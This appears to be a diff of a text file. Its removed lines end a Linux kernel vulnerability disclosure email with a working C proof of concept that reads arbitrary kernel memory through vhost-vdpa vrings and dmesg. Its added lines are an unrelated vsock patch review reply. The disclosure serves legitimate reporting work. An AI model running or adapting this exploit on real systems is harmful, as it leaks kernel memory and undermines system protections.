-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
-> 	nlh->nlmsg_type = GENL_ID_CTRL;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST;
-> 	nlh->nlmsg_seq = ++nlseq;
-> 	gh = NLMSG_DATA(nlh);
-> 	gh->cmd = CTRL_CMD_GETFAMILY;
-> 	gh->version = 1;
-> 	nla_put_str(nlh, sizeof(buf), CTRL_ATTR_FAMILY_NAME, name);
-> 	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
-> 	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
-> 	struct msghdr msg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &iov, .msg_iovlen = 1 };
-> 	if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg getfamily"); return -1; }
-> 	char rbuf[4096];
-> 	struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
-> 	struct msghdr rmsg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &riov, .msg_iovlen = 1 };
-> 	ssize_t n = recvmsg(nlsock, &rmsg, 0);
-> 	if (n < 0) { xp("recvmsg getfamily"); return -1; }
-> 	struct nlmsghdr *r = (void *)rbuf;
-> 	if (!NLMSG_OK(r, (size_t)n)) return -1;
-> 	if (r->nlmsg_type == NLMSG_ERROR) { struct nlmsgerr *e = NLMSG_DATA(r); fprintf(stderr, "genl getfamily error %d\n", e->error); return -1; }
-> 	int hlen = GENL_HDRLEN;
-> 	struct nlattr *na = (void *)r + NLMSG_HDRLEN + hlen;
-> 	int rem = (int)(r->nlmsg_len - NLMSG_HDRLEN - hlen);
-> 	*fam_id = 0;
-> 	for (; nla_ok_(na, rem); na = nla_next_(na, &rem)) {
-> 		if (na->nla_type == CTRL_ATTR_FAMILY_ID) {
-> 			*fam_id = *(__u16 *)nla_data_(na);
-> 			return 0;
-> 		}
-> 	}
-> 	return -1;
-> }
-> 
-> static int genl_dev_new(__u16 fam, const char *mgmtdev, const char *devname)
-> {
-> 	char buf[1024];
-> 	struct nlmsghdr *nlh = (void *)buf;
-> 	struct genlmsghdr *gh;
-> 	memset(buf, 0, sizeof(buf));
-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
-> 	nlh->nlmsg_type = fam;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-> 	nlh->nlmsg_seq = ++nlseq;
-> 	gh = NLMSG_DATA(nlh);
-> 	gh->cmd = VDPA_CMD_DEV_NEW;
-> 	gh->version = VDPA_GENL_VERSION;
-> 	if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_MGMTDEV_DEV_NAME, mgmtdev) < 0) return -1;
-> 	if (nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname) < 0) return -1;
-> 	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
-> 	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
-> 	struct msghdr msg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &iov, .msg_iovlen = 1 };
-> 	if (sendmsg(nlsock, &msg, 0) < 0) { xp("sendmsg dev_new"); return -1; }
-> 	char rbuf[4096];
-> 	struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
-> 	struct msghdr rmsg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &riov, .msg_iovlen = 1 };
-> 	ssize_t n = recvmsg(nlsock, &rmsg, 0);
-> 	if (n < 0) { xp("recvmsg dev_new"); return -1; }
-> 	struct nlmsghdr *r = (void *)rbuf;
-> 	if (!NLMSG_OK(r, (size_t)n)) return -1;
-> 	if (r->nlmsg_type == NLMSG_ERROR) {
-> 		struct nlmsgerr *e = NLMSG_DATA(r);
-> 		if (e->error == 0)
-> 			return 0;
-> 		fprintf(stderr, "dev_new error %d (%s)\n", e->error, strerror(-e->error));
-> 		return -1;
-> 	}
-> 	return 0;
-> }
-> 
-> static int genl_dev_del(__u16 fam, const char *devname)
-> {
-> 	char buf[1024];
-> 	struct nlmsghdr *nlh = (void *)buf;
-> 	struct genlmsghdr *gh;
-> 	memset(buf, 0, sizeof(buf));
-> 	nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*gh));
-> 	nlh->nlmsg_type = fam;
-> 	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
-> 	nlh->nlmsg_seq = ++nlseq;
-> 	gh = NLMSG_DATA(nlh);
-> 	gh->cmd = VDPA_CMD_DEV_DEL;
-> 	gh->version = VDPA_GENL_VERSION;
-> 	nla_put_str(nlh, sizeof(buf), VDPA_ATTR_DEV_NAME, devname);
-> 	struct sockaddr_nl dst = { .nl_family = AF_NETLINK };
-> 	struct iovec iov = { .iov_base = nlh, .iov_len = nlh->nlmsg_len };
-> 	struct msghdr msg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &iov, .msg_iovlen = 1 };
-> 	sendmsg(nlsock, &msg, 0);
-> 	char rbuf[4096]; struct iovec riov = { .iov_base = rbuf, .iov_len = sizeof(rbuf) };
-> 	struct msghdr rmsg = { .msg_name = &dst, .msg_namelen = sizeof(dst), .msg_iov = &riov, .msg_iovlen = 1 };
-> 	recvmsg(nlsock, &rmsg, 0);
-> 	return 0;
-> }
-> 
-> static unsigned long ksym(const char *want)
-> {
-> 	FILE *f = fopen("/proc/kallsyms", "r");
-> 	if (!f) return 0;
-> 	char line[512];
-> 	unsigned long a = 0;
-> 	while (fgets(line, sizeof(line), f)) {
-> 		char type; char name[256];
-> 		if (sscanf(line, "%lx %c %255s", &a, &type, name) == 3) {
-> 			if (strcmp(name, want) == 0) { fclose(f); return a; }
-> 		}
-> 	}
-> 	fclose(f);
-> 	return 0;
-> }
-> 
-> static int expected_leak(unsigned *out)
-> {
-> 	FILE *f = fopen("/proc/version", "r");
-> 	if (!f) return -1;
-> 	char v[256];
-> 	if (!fgets(v, sizeof(v), f)) { fclose(f); return -1; }
-> 	fclose(f);
-> 	int len = (int)strlen(v);
-> 	if (len < 6) return -1;
-> 	unsigned m = ((unsigned)(unsigned char)v[4]) | (((unsigned)(unsigned char)v[5]) << 8);
-> 	*out = m;
-> 	fprintf(stderr, "[*] /proc version bytes[4,5] = 0x%02x 0x%02x  => expected leak M = 0x%04x (%u)\n",
-> 		(unsigned char)v[4], (unsigned char)v[5], m, m);
-> 	fprintf(stderr, "[*] /proc/version = %.40s\n", v);
-> 	return 0;
-> }
-> 
-> int main(int argc, char **argv)
-> {
-> 	unsigned exp;
-> 	if (expected_leak(&exp)) die("cannot read /proc/version");
-> 	unsigned long banner = ksym("linux_banner");
-> 	fprintf(stderr, "[*] linux_banner @ 0x%lx\n", banner);
-> 	if (!banner) die("linux_banner not in /proc/kallsyms (need root)");
-> 
-> 	nlsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-> 	if (nlsock < 0) die("netlink socket");
-> 	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
-> 	if (bind(nlsock, (struct sockaddr *)&sa, sizeof(sa)) < 0) die("netlink bind");
-> 	__u16 fam;
-> 	if (genl_resolve_family(VDPA_GENL_NAME, &fam)) die("resolve genl family 'vdpa' (CONFIG_VDPA?)");
-> 	fprintf(stderr, "[*] genl family 'vdpa' id=%u\n", fam);
-> 	if (genl_dev_new(fam, "vdpasim_blk", "sim0")) die("dev_new vdpasim_blk (CONFIG_VDPA_SIM_BLOCK?)");
-> 	fprintf(stderr, "[*] created vdpa device sim0 (vdpasim_blk)\n");
-> 
-> 	char path[64]; int vfd = -1;
-> 	for (int i = 0; i < 50; i++) {
-> 		snprintf(path, sizeof(path), "/dev/vhost-vdpa-%d", i);
-> 		vfd = open(path, O_RDWR | O_CLOEXEC);
-> 		if (vfd >= 0) break;
-> 	}
-> 	if (vfd < 0) die("open /dev/vhost-vdpa-*");
-> 	fprintf(stderr, "[*] opened %s fd=%d\n", path, vfd);
-> 
-> 	int callfd = eventfd(0, EFD_CLOEXEC);
-> 	int kickfd = eventfd(0, EFD_CLOEXEC);
-> 	if (callfd < 0 || kickfd < 0) die("eventfd");
-> 
-> 	if (ioctl(vfd, VHOST_SET_OWNER)) die("VHOST_SET_OWNER");
-> 
-> 	__u64 bf = 0;
-> 	if (ioctl(vfd, VHOST_GET_BACKEND_FEATURES, &bf)) xp("get_backend_features");
-> 	__u64 setbf = bf | (1ULL << VHOST_BACKEND_F_IOTLB_MSG_V2)
-> 	               | (1ULL << VHOST_BACKEND_F_IOTLB_BATCH)
-> 	               | (1ULL << VHOST_BACKEND_F_IOTLB_ASID)
-> 	               | (1ULL << VHOST_BACKEND_F_ENABLE_AFTER_DRIVER_OK);
-> 	if (ioctl(vfd, VHOST_SET_BACKEND_FEATURES, &setbf)) xp("set_backend_features");
-> 
-> 	__u64 feat = 0;
-> 	if (ioctl(vfd, VHOST_GET_FEATURES, &feat)) die("get_features");
-> 	__u64 ack = 0;
-> 	ack |= (1ULL << VIRTIO_F_ACCESS_PLATFORM);
-> 	ack |= (1ULL << VIRTIO_F_VERSION_1);
-> 	ack |= (1ULL << VIRTIO_F_ANY_LAYOUT);
-> 	ack &= feat;
-> 	if (!(ack & (1ULL << VIRTIO_F_ACCESS_PLATFORM))) die("ACCESS_PLATFORM not supported - no use_va?");
-> 	if (ioctl(vfd, VHOST_SET_FEATURES, &ack)) die("set_features (need ACCESS_PLATFORM)");
-> 
-> 	struct vhost_vring_state vs = { .index = 0, .num = 1 };
-> 	if (ioctl(vfd, VHOST_SET_VRING_NUM, &vs)) die("set_vring_num");
-> 
-> 	size_t pg = 4096;
-> 	void *descbuf = mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
-> 	void *usedbuf = mmap(NULL, pg, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
-> 	if (descbuf == MAP_FAILED || usedbuf == MAP_FAILED) die("mmap");
-> 	memset(descbuf, 0, pg); memset(usedbuf, 0, pg);
-> 
-> 	struct vhost_vring_addr va = {0};
-> 	va.index = 0;
-> 	va.flags = 0;
-> 	va.desc_user_addr  = (uintptr_t)descbuf;
-> 	va.avail_user_addr = (uintptr_t)banner;   /* <-- KERNEL address, the leak source */
-> 	va.used_user_addr  = (uintptr_t)usedbuf;
-> 	va.log_guest_addr  = 0;
-> 	if (ioctl(vfd, VHOST_SET_VRING_ADDR, &va)) die("set_vring_addr (avail=kernel addr rejected?)");
-> 
-> 	struct vhost_vring_state base = { .index = 0, .num = 0 };
-> 	if (ioctl(vfd, VHOST_SET_VRING_BASE, &base)) die("set_vring_base");
-> 
-> 	struct vhost_vring_file cf = { .index = 0, .fd = callfd };
-> 	if (ioctl(vfd, VHOST_SET_VRING_CALL, &cf)) die("set_vring_call");
-> 	struct vhost_vring_file kf = { .index = 0, .fd = kickfd };
-> 	if (ioctl(vfd, VHOST_SET_VRING_KICK, &kf)) die("set_vring_kick");
-> 
-> 	struct vhost_vring_state en = { .index = 0, .num = 1 };
-> 	if (ioctl(vfd, VHOST_VDPA_SET_VRING_ENABLE, &en)) die("set_vring_enable");
-> 
-> 	__u8 status = VIRTIO_CONFIG_S_ACKNOWLEDGE | VIRTIO_CONFIG_S_DRIVER
-> 	            | VIRTIO_CONFIG_S_FEATURES_OK | VIRTIO_CONFIG_S_DRIVER_OK;
-> 	if (ioctl(vfd, VHOST_VDPA_SET_STATUS, &status)) die("set_status DRIVER_OK");
-> 
-> 	uint64_t one = 1;
-> 	if (write(kickfd, &one, sizeof(one)) != sizeof(one)) die("kick write");
-> 
-> 	unsigned leaked = 0; int found = 0;
-> 	for (int try = 0; try < 20 && !found; try++) {
-> 		usleep(100000);
-> 		FILE *d = popen("dmesg 2>/dev/null", "r");
-> 		if (d) {
-> 			char l[512];
-> 			while (fgets(l, sizeof(l), d)) {
-> 				char *p = strstr(l, "Guest says index");
-> 				if (p) {
-> 					unsigned idx = 0, numv = 0;
-> 					if (sscanf(p, "Guest says index %u > %u is available",
-> 						   &idx, &numv) >= 1) {
-> 						leaked = idx; found = 1;
-> 						fprintf(stderr, "[!!] dmesg: %s", l);
-> 						break;
-> 					}
-> 				}
-> 			}
-> 			pclose(d);
-> 		}
-> 	}
-> 
-> 	if (!found) {
-> 		fprintf(stderr, "[!] no vringh_bad leak line in dmesg; dumping tail:\n");
-> 		FILE *d = popen("dmesg 2>/dev/null | tail -40", "r");
-> 		if (d) { char l[512]; while (fgets(l, sizeof(l), d)) fputs(l, stderr); pclose(d); }
-> 		die("leak not observed (worker may not have run, or use_va/mm_bound not set)");
-> 	}
-> 
-> 	fprintf(stderr, "\n=== RESULT ===\n");
-> 	fprintf(stderr, "leaked kernel u16 @ linux_banner+4 = 0x%04x (%u)\n", leaked, leaked);
-> 	fprintf(stderr, "expected (/proc/version[4,5])     = 0x%04x (%u)\n", exp, exp);
-> 	if (leaked == exp) {
-> 		fprintf(stderr, "MATCH: __get_user read 2 bytes at kernel addr 0x%lx via vringh.c:1216\n", banner + 4);
-> 		fprintf(stderr, "PROVEN: arbitrary-kernel-address 2-byte read (no access_ok) on unmodified kernel\n");
-> 	} else {
-> 		fprintf(stderr, "MISMATCH - investigate\n");
-> 	}
-> 
-> 	status = 0; ioctl(vfd, VHOST_VDPA_SET_STATUS, &status);
-> 	close(vfd); close(callfd); close(kickfd);
-> 	genl_dev_del(fam, "sim0");
-> 	return (leaked == exp) ? 0 : 2;
-> }
-> ```
-> 
-> Captured dmesg from the 7.2.10 run (the disclosed leaked value):
-> ```
-> [    1.882938] vringh:
-> [    1.882944] Guest says index 8312 > 1 is available
-> ```
-> 
-> 7. Impact
-> Privileged kernel memory information leak: a CAP_NET_ADMIN controller can
-> read 2 bytes at an arbitrary kernel virtual address per vring kick via
-> __get_user() with no access_ok(), and the value is disclosed to dmesg via
-> vringh_bad(). The read is repeatable, so the whole kernel address space
-> can be scanned 2 bytes at a time (kernel .text/.data, structure contents,
-> in-memory keys). CAP_NET_ADMIN should not grant arbitrary kernel-memory
-> reads. No memory corruption. KASLR does not prevent it (only the address 
-> is randomized, the leaked content is constant). Only the use_va mode is 
-> affected (the non-use_va path goes through GUP, which has an equivalent 
-> check_range guard).
-> 
-> Please let me know if you need more detail.
-> 
-> Best regards,
-> Haoran Wang <haoranwangsec@gmail.com>
+> >+ */
+> >+static bool
+> >+virtio_transport_recv_pkt_locked(struct virtio_transport *t,
+> >+                               struct sk_buff *skb, struct sock *sk)
+> >+{
+> >+      struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
+> >+      struct sockaddr_vm src;
+> >+      struct vsock_sock *vsk = vsock_sk(sk);
+> >+      bool space_available;
+>
+> Please, follow the netdev convection for ordering local variables:
+> https://www.kernel.org/doc/html/v7.2/process/maintainer-netdev.html#local-variable-ordering-reverse-xmas-tree-rcs
+>
 
+Sorry about that. You had pointed me to this guideline before, and I
+missed this during the final preparation. That's entirely my
+oversight, and I will fix the declaration ordering throughout the
+series in v5.
+
+
+> >
+> >-      lock_sock(sk);
+> >+      vsock_addr_init(&src, le64_to_cpu(hdr->src_cid),
+> >+                      le32_to_cpu(hdr->src_port));
+> >
+> >-      /* Check if sk has been closed or assigned to another transport before
+> >-       * lock_sock (note: listener sockets are not assigned to any transport)
+> >+      /* Listener sockets accept packets from any source and are not assigned to
+> >+       * a transport.
+> >        */
+>
+> Why changing this comment in this commit?
+>
+> Oh because we moved out lock_sock, right?
+>
+> I think we should keep in some way the old info that was much more
+> informative that the current comment that just say what the check is
+> doing and not why.
+>
+
+Yes, I changed it because lock_sock() moved to the caller, so the old
+wording no longer read clearly at that location. But I over-shortened
+it and dropped the important reason for the recheck. I'll restore that
+explanation:
+
+
+> >       if (sock_flag(sk, SOCK_DONE) ||
+> >           (sk->sk_state != TCP_LISTEN &&
+> >            !vsock_check_source(vsk, &t->transport, &src))) {
+> >-              (void)virtio_transport_reset_no_sock(t, skb, net);
+> >-              release_sock(sk);
+> >-              sock_put(sk);
+> >-              goto free_pkt;
+> >+              (void)virtio_transport_reset_no_sock(t, skb, sock_net(sk));
+>
+> We need to be careful here, IIRC Bobby used the net from the caller for
+> a reason.
+>
+> Are you sure it's fine this change? Why not passing net as parameter and
+> minimize changes?
+>
+
+I assumed sock_net(sk) was interchangeable with the caller's net after
+a successful lookup, but I took that equivalence for granted. I'll
+change this in v5.
+
+> >+              return true;
+> >       }
+> >
+> >       space_available = virtio_transport_space_update(sk, skb);
+> >
+> >       /* Update CID in case it has changed after a transport reset event */
+> >       if (vsk->local_addr.svm_cid != VMADDR_CID_ANY)
+> >-              vsk->local_addr.svm_cid = dst.svm_cid;
+> >+              vsk->local_addr.svm_cid = le64_to_cpu(hdr->dst_cid);
+> >
+> >       if (space_available)
+> >               sk->sk_write_space(sk);
+> >@@ -1870,17 +1849,60 @@ void virtio_transport_recv_pkt(struct virtio_transport *t,
+> >               kfree_skb(skb);
+> >               break;
+> >       default:
+> >-              (void)virtio_transport_reset_no_sock(t, skb, net);
+> >+              (void)virtio_transport_reset_no_sock(t, skb, sock_net(sk));
+> >               kfree_skb(skb);
+> >               break;
+> >       }
+> >
+> >+      return false;
+> >+}
+> >+
+> >+/* We are under the virtio-vsock's vsock->rx_lock or vhost-vsock's vq->mutex
+> >+ * lock.
+> >+ */
+> >+void virtio_transport_recv_pkt(struct virtio_transport *t,
+> >+                             struct sk_buff *skb, struct net *net)
+> >+{
+> >+      struct virtio_vsock_hdr *hdr = virtio_vsock_hdr(skb);
+> >+      struct sockaddr_vm src, dst;
+> >+      struct sock *sk;
+> >+      bool free_pkt;
+> >+
+> >+      vsock_addr_init(&src, le64_to_cpu(hdr->src_cid),
+> >+                      le32_to_cpu(hdr->src_port));
+> >+      vsock_addr_init(&dst, le64_to_cpu(hdr->dst_cid),
+> >+                      le32_to_cpu(hdr->dst_port));
+> >+
+> >+      trace_virtio_transport_recv_pkt(src.svm_cid, src.svm_port,
+> >+                                      dst.svm_cid, dst.svm_port,
+> >+                                      le32_to_cpu(hdr->len),
+> >+                                      le16_to_cpu(hdr->type),
+> >+                                      le16_to_cpu(hdr->op),
+> >+                                      le32_to_cpu(hdr->flags),
+> >+                                      le32_to_cpu(hdr->buf_alloc),
+> >+                                      le32_to_cpu(hdr->fwd_cnt));
+> >+
+> >+      sk = virtio_transport_find_socket(skb, &src, &dst, net);
+> >+      if (!sk) {
+> >+              (void)virtio_transport_reset_no_sock(t, skb, net);
+> >+              goto free_pkt;
+> >+      }
+> >+
+> >+      if (!skb_set_owner_sk_safe(skb, sk)) {
+> >+              WARN_ONCE(1, "receiving vsock socket has sk_refcnt == 0\n");
+> >+              goto free_pkt;
+> >+      }
+> >+
+> >+      lock_sock(sk);
+> >+      free_pkt = virtio_transport_recv_pkt_locked(t, skb, sk);
+> >       release_sock(sk);
+> >
+> >       /* Release refcnt obtained when we fetched this socket out of the
+> >        * bound or connected list.
+> >        */
+> >       sock_put(sk);
+> >+      if (free_pkt)
+> >+              kfree_skb(skb);
+> >       return;
+> >
+> > free_pkt:
+> >--
+> >2.53.0
+> >
+>
